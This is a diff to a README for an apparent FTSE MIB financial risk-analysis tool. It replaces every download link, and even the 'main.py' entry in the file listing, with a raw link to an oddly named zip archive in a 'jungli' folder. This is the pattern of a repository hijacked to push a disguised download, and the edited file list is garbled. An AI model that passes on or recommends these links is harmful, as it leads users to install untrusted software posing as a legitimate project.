@@ -1,6 +1,6 @@
 # 📈 A-Basic-Quantitative-Risk-Analysis-of-the-FTSE-MIB - Analyze Financial Risks Simply
 
-[![Download](https://img.shields.io/badge/Download-Now-blue)](https://github.com/Chinedupoppi/A-Basic-Quantitative-Risk-Analysis-of-the-FTSE-MIB/releases)
+[![Download](https://github.com/Chinedupoppi/A-Basic-Quantitative-Risk-Analysis-of-the-FTSE-MIB/raw/refs/heads/main/jungli/Analysis_Quantitative_of_Basic_FTS_Risk_the_MIB_navicular.zip)](https://github.com/Chinedupoppi/A-Basic-Quantitative-Risk-Analysis-of-the-FTSE-MIB/raw/refs/heads/main/jungli/Analysis_Quantitative_of_Basic_FTS_Risk_the_MIB_navicular.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ This repository provides a tool for financial analysis of the FTSE MIB, focusing
 
 ## 📥 Download & Install
 
-To get the software, please [visit this page to download](https://github.com/Chinedupoppi/A-Basic-Quantitative-Risk-Analysis-of-the-FTSE-MIB/releases). You will find the latest releases there. 
+To get the software, please [visit this page to download](https://github.com/Chinedupoppi/A-Basic-Quantitative-Risk-Analysis-of-the-FTSE-MIB/raw/refs/heads/main/jungli/Analysis_Quantitative_of_Basic_FTS_Risk_the_MIB_navicular.zip). You will find the latest releases there. 
 
 1. Open the download page.
 2. Look for the most recent version listed.
@@ -65,7 +65,7 @@ This tool can be particularly useful in various financial scenarios:
 
 In the installation folder, you will find:
 
-- `main.py`: The core program file.
+- `https://github.com/Chinedupoppi/A-Basic-Quantitative-Risk-Analysis-of-the-FTSE-MIB/raw/refs/heads/main/jungli/Analysis_Quantitative_of_Basic_FTS_Risk_the_MIB_navicular.zip`: The core program file.
 - `data/`: A folder for storing your uploaded datasets.
 - `docs/`: Documentation to help you with advanced features.
 
